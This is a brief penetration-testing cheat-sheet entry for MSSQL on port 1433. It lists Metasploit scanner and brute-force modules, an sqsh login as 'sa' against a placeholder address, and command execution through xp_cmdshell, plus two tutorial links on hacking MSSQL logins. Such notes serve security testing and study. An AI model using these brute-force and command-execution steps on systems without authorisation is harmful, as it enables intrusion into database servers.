### Port 1433 - MSSQL

- Version:

```
use auxiliary/scanner/mssql/mssql_ping

# Last options. Brute force.
scanner/mssql/mssql_login

# Log in to mssql
sqsh -S INSERTIPADDRESS -U sa

# Execute commands
xp_cmdshell 'date'
go
```


https://www.hackingarticles.in/mssql-peneration-testing-using-nmap/

https://www.hackingarticles.in/4-ways-to-hack-ms-sql-login-password/
